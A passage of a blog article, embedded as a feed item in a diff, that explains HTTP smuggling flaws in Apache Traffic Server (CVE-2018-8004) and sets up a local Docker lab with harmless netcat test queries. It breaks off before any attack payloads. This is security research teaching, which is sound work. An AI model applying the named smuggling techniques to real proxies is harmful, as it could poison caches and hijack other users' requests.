@@ -6,6 +6,921 @@
 		<link>http://regilero.github.io</link>
 		
 			<item>
+				<title>Security: HTTP Smuggling, Apache Traffic Server</title>
+				<description>&lt;p&gt;&lt;small&gt;&lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; disponible sur &lt;a href=&quot;https://www.makina-corpus.com/blog/metier/2018/securite-contrebande-de-http-apache-traffic-server&quot;&gt;makina corpus&lt;/a&gt;).&lt;/small&gt;
+&lt;small&gt;estimated read time: 15 min to really more&lt;/small&gt;&lt;/p&gt;
+
+&lt;h2&gt;What is this about ?&lt;/h2&gt;
+
+&lt;p&gt;This article will give a deep explanation of HTTP Smuggling issues present in &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2018-8004&quot;&gt;CVE-2018-8004&lt;/a&gt;. Firstly because there&#39;s currently not much informations about it (&lt;em&gt;&quot;Undergoing Analysis&quot;&lt;/em&gt; at the time of this writing on the previous link). Secondly some time has passed since the official announce (and even more since the availability of fixs in v7), also mostly because I keep receiving demands on what exactly is HTTP Smuggling and how to test/exploit this type of issues, also beacause Smuggling issues are now trending and easier to test &lt;a href=&quot;https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn&quot;&gt;thanks for the great stuff of James Kettle&lt;/a&gt; (&lt;a href=&quot;https://twitter.com/albinowax&quot;&gt;@albinowax&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;So, this time, I&#39;ll give you not only &lt;strong&gt;details&lt;/strong&gt; but also a step by step &lt;strong&gt;demo&lt;/strong&gt; with some &lt;strong&gt;DockerFiles&lt;/strong&gt; to build your own test lab.
+You could use that test lab to experiment it with manual raw queries, or test the recently added &lt;a href=&quot;https://portswigger.net/burp/communitydownload&quot;&gt;BURP Suite&lt;/a&gt; Smuggling tools. I&#39;m really
+a big partisan of always searching for Smuggling issues in non production environements, for legal reasons and also to avoid unattended
+consequences (and we&#39;ll see in this article, with the last issue, that unattended behaviors can always happen).&lt;/p&gt;
+
+&lt;h2&gt;Apache Traffic Server ?&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://trafficserver.apache.org/&quot;&gt;Apache Traffic Server, or ATS&lt;/a&gt; is an Open Source HTTP load balancer and Reverse Proxy Cache. Based on a Commercial product donated to the Apache Foundation. It&#39;s not related to Apache httpd HTTP server, the &quot;Apache&quot; name comes from the Apache foundation, the code is very different
+from httpd.&lt;/p&gt;
+
+&lt;p&gt;If you were to search from ATS installations &lt;a href=&quot;https://www.shodan.io/search?query=Server%3A+ATS&quot;&gt;on the wild&lt;/a&gt; you would find some, hopefully fixed now.&lt;/p&gt;
+
+&lt;h3&gt;Fixed versions of ATS&lt;/h3&gt;
+
+&lt;p&gt;As stated in the &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2018-8004&quot;&gt;CVE announce&lt;/a&gt; (2018-08-28) impacted ATS versions are versions &lt;strong&gt;6.0.0 to 6.2.2&lt;/strong&gt; and &lt;strong&gt;7.0.0 to 7.1.3&lt;/strong&gt;. Version 7.1.4 was released in 2018-08-02 and 6.2.3 in 2018-08-04. That&#39;s the offical announce, but I think 7.1.3 contained most of the fixs already, and is maybe not vulnerable. The announce was mostly delayed for 6.x backports (and some other fixs are relased in the same time, on other issues).&lt;/p&gt;
+
+&lt;p&gt;If you wonder about previous versions, like 5.x, they&#39;re out of support, and quite certainly vulnerable. &lt;strong&gt;Do not use out of support versions.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2&gt;CVE-2018-8004&lt;/h2&gt;
+
+&lt;p&gt;The &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2018-8004&quot;&gt;official CVE description&lt;/a&gt; is:&lt;/p&gt;
+
+&lt;blockquote&gt;&lt;p&gt;There are multiple HTTP smuggling and cache poisoning issues when clients making malicious requests interact with ATS.&lt;/p&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;Which does not gives a lot of pointers, but there&#39;s much more information in the 4 pull requests listed:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/apache/trafficserver/pull/3192&quot;&gt;#3192: Return 400 if there is whitespace after the field name and before the colon&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/apache/trafficserver/pull/3201&quot;&gt;#3201: Close the connection when returning a 400 error response&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/apache/trafficserver/pull/3231&quot;&gt;#3231: Validate Content-Length headers for incoming requests &lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/apache/trafficserver/pull/3251&quot;&gt;#3251:  Drain the request body if there is a cache hit&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;p&gt;If you already studied some of my previous posts, some of these sentences might already seems dubious. For example not closing a response stream after an error 400 is clearly a fault, based on the standards, but is also a good catch for an attacker. Chances are that crafting a bad messages chain you may succeed at receiving a response for some queries hidden in the body of an invalid request.&lt;/p&gt;
+
+&lt;p&gt;The last one, &lt;em&gt;Drain the request body if there is a cache hit&lt;/em&gt; is the nicest one, as we will see on this article, and it was hard to detect.&lt;/p&gt;
+
+&lt;p&gt;My original report listed 5 issues:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;HTTP request splitting&lt;/strong&gt; using NULL character in header value&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HTTP request splitting&lt;/strong&gt; using huge header size&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HTTP request splitting&lt;/strong&gt; using double Content-length headers&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HTTP cache poisoning&lt;/strong&gt; using extra space before separator of header name and header value&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HTTP request splitting&lt;/strong&gt; using ...&lt;em&gt;(no spoiler: I keep that for the end)&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;h2&gt;Step by step Proof of Concept&lt;/h2&gt;
+
+&lt;p&gt;To understand the issues, and see the effects, We will be using a demonstration/research environment.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;If you either want to test HTTP Smuggling issues you should really, really, try to test it on a controlled environment. Testing issues on live environments would be difficult because:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;You may have some very good HTTP agents (load balancers, SSL terminators, security filters) between you and your target, hiding most of your success and errors.&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;You may triggers errors and behaviors that you have no idea about, for example I have encountered random errors on several fuzzing tests (on test envs), unreproductible, before understanding that this was related to the last smuggling issue we will study on this article. Effects were delayed on subsequent tests, and I was not in control, at all.&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;You may trigger errors on requests sent by other users, and/or for other domains. That&#39;s not like testing a self reflected XSS, you could end up in a court for that.&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Real life complete examples usually occurs with interactions between several different HTTP agents, like Nginx + Varnish, or ATS + HaProxy, or Pound + IIS + Nodejs, etc. You will have to understand how each actor interact with the other, and you will see it faster with a local low level network capture than blindly accross an unknown chain of agents (like for example to learn how to detect each agent on this chain).&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;p&gt;So it&#39;s very important to be able to rebuild a laboratory env.&lt;/p&gt;
+
+&lt;p&gt;And, if you find something, this env can then be used to send detailled bug reports to the program owners (in my own experience, it can sometimes be quite difficult to explain the issues, a working demo helps).&lt;/p&gt;
+
+&lt;h3&gt;Set-up the lab: Docker instances&lt;/h3&gt;
+
+&lt;p&gt;We will run 2 Apache Traffic Server Instance, one in version 6.x and one in version 7.x.&lt;/p&gt;
+
+&lt;p&gt;To add some alterity, and potential smuggling issues, we will also add an Nginx docker, and an HaProy one.&lt;/p&gt;
+
+&lt;p&gt;4 HTTP actors, each one on a local port:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;127.0.0.1:8001&lt;/strong&gt; : &lt;a href=&quot;https://www.haproxy.org/&quot;&gt;HaProxy&lt;/a&gt; (internally listening on port &lt;strong&gt;80&lt;/strong&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;127.0.0.1:8002&lt;/strong&gt; : Nginx (internally listening on port &lt;strong&gt;80&lt;/strong&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;127.0.0.1:8007&lt;/strong&gt; : ATS7 (internally listening on port &lt;strong&gt;8080&lt;/strong&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;127.0.0.1:8006&lt;/strong&gt; : ATS6 (internally listening on port &lt;strong&gt;8080&lt;/strong&gt;), most examples will use ATS7, but you will ba able to test this older version simply using this port instead of the other (and altering the domain).&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;p&gt;We will chain some Reverse Proxy relations, Nginx will be the final backend, HaProxy the front load balancer, and between Nginx and HaProxy we will go through ATS6 or ATS7 based on the domain name used (&lt;strong&gt;dummy-host7.example.com&lt;/strong&gt; for ATS7 and &lt;strong&gt;dummy-host6.example.com&lt;/strong&gt; for ATS6)&lt;/p&gt;
+
+&lt;p&gt;Note that the &lt;strong&gt;localhost port mapping&lt;/strong&gt; of the ATS and Nginx instances are not directly needed, if you can inject a request to Haproxy it will reach Nginx internally, via port 8080 of one of the ATS, and port 80 of Nginx. But that could be usefull if you want to target directly one of the server, and we will have to avoid the HaProxy part on most examples, because most attacks would be blocked by this load balancer. So most examples will directly target the ATS7 server first, on 8007. Later you can try to suceed targeting 8001, that will be harder.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;                       +---[80]---+
+                       | 8001-&amp;gt;80 |
+                       |  HaProxy |
+                       |          |
+                       +--+---+---+
+[dummy-host6.example.com] |   | [dummy-host7.example.com]
+                  +-------+   +------+
+                  |                  |
+              +-[8080]-----+     +-[8080]-----+
+              | 8006-&amp;gt;8080 |     | 8007-&amp;gt;8080 |
+              |  ATS6      |     |  ATS7      |
+              |            |     |            |
+              +-----+------+     +----+-------+
+                    |               |
+                    +-------+-------+
+                            |
+                       +--[80]----+
+                       | 8002-&amp;gt;80 |
+                       |  Nginx   |
+                       |          |
+                       +----------+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To build this cluster we will use docker-compose, You can the find the &lt;a href=&quot;//regilero.github.io/theme/resource/ats/docker-compose.yml&quot;&gt;docker-compose.yml file here&lt;/a&gt;, but the content is quite short:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;l-Scalar-Plain&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
+&lt;span class=&quot;l-Scalar-Plain&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;l-Scalar-Plain&quot;&gt;haproxy&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;haproxy:1.6&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;l-Scalar-Plain&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;.&lt;/span&gt;
+      &lt;span class=&quot;l-Scalar-Plain&quot;&gt;dockerfile&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;Dockerfile-haproxy&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;expose&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;80&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;8001:80&amp;quot;&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;links&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;ats7:linkedats7.net&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;ats6:linkedats6.net&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;depends_on&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;ats7&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;ats6&lt;/span&gt;
+  &lt;span class=&quot;l-Scalar-Plain&quot;&gt;ats7&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;centos:7&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;l-Scalar-Plain&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;.&lt;/span&gt;
+      &lt;span class=&quot;l-Scalar-Plain&quot;&gt;dockerfile&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;Dockerfile-ats7&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;expose&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;8080&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;8007:8080&amp;quot;&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;depends_on&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;nginx&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;links&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;nginx:linkednginx.net&lt;/span&gt;
+  &lt;span class=&quot;l-Scalar-Plain&quot;&gt;ats6&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;centos:7&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;l-Scalar-Plain&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;.&lt;/span&gt;
+      &lt;span class=&quot;l-Scalar-Plain&quot;&gt;dockerfile&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;Dockerfile-ats6&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;expose&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;8080&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;8006:8080&amp;quot;&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;depends_on&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;nginx&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;links&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;nginx:linkednginx.net&lt;/span&gt;
+  &lt;span class=&quot;l-Scalar-Plain&quot;&gt;nginx&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;nginx:latest&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;l-Scalar-Plain&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;.&lt;/span&gt;
+      &lt;span class=&quot;l-Scalar-Plain&quot;&gt;dockerfile&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;Dockerfile-nginx&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;expose&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;80&lt;/span&gt;
+    &lt;span class=&quot;l-Scalar-Plain&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;8002:80&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;To make this work you will also need the 4 specific Dockerfiles:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;//regilero.github.io/theme/resource/ats/Dockerfile-haproxy&quot;&gt;Docker-haproxy: an HaProxy Dockerfile, with the right conf&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;//regilero.github.io/theme/resource/ats/Dockerfile-nginx&quot;&gt;Docker-nginx: A very simple Nginx Dockerfile with one index.html page&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;//regilero.github.io/theme/resource/ats/Dockerfile-ats7&quot;&gt;Docker-ats7: An ATS 7.1.1 compiled from archive Dockerfile&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;//regilero.github.io/theme/resource/ats/Dockerfile-ats6&quot;&gt;Docker-ats6: An ATS 6.2.2 compiled from archive Dockerfile&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;p&gt;Put all theses files (the &lt;code&gt;docker-compose.yml&lt;/code&gt; and the &lt;code&gt;Dockerfile-*&lt;/code&gt; files) into a working directory and run in this dir:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;docker-compose build &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; docker-compose up&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;You can now take a &lt;strong&gt;big break&lt;/strong&gt;, you are launching two compilations of ATS. Hopefully the next time a &lt;code&gt;up&lt;/code&gt; will be enough, and even the &lt;code&gt;build&lt;/code&gt; may not redo the compilation steps.&lt;/p&gt;
+
+&lt;p&gt;You can easily add another &lt;code&gt;ats7-fixed&lt;/code&gt; element on the cluster, to test fixed version of ATS if you want. For now we will concentrate on detecting issues in flawed versions.&lt;/p&gt;
+
+&lt;h3&gt;Test That Everything Works&lt;/h3&gt;
+
+&lt;p&gt;We will run &lt;strong&gt;basic non attacking queries&lt;/strong&gt; on this installation, to check that everything is working, and to train ourselves on the &lt;code&gt;printf + netcat&lt;/code&gt; way of running queries. We will not use curl or wget to run HTTP query, because that would be impossible to write bad queries. So we need to use low level string manipulations (with &lt;code&gt;printf&lt;/code&gt; for example) and socket handling (with &lt;code&gt;netcat&lt;/code&gt; -- or &lt;code&gt;nc&lt;/code&gt; --).&lt;/p&gt;
+
+&lt;p&gt;Test Nginx (that&#39;s a one-liner splitted for readability):&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc 127.0.0.1 8002&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;You should get the &lt;code&gt;index.html&lt;/code&gt; response, something like:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;nginx/1.15.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Fri, 26 Oct 2018 15:28:20 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;text/html&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;120&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Last-Modified&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Fri, 26 Oct 2018 14:16:28 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;keep-alive&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;ETag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;&amp;quot;5bd321bc-78&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Location-echo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;/&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Default-VH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;public, max-age=300&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Ranges&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;bytes&lt;/span&gt;
+
+$&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;Nginx default static page&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Hello World&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;It works!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then test ATS7 and ATS6:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc 127.0.0.1 8007
+
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:dummy-host6.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc 127.0.0.1 8006&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then test HaProxy, altering the &lt;code&gt;Host&lt;/code&gt; name should make the transit via ATS7 or ATS6 (check the &lt;code&gt;Server:&lt;/code&gt; header response):&lt;/p&gt;
+
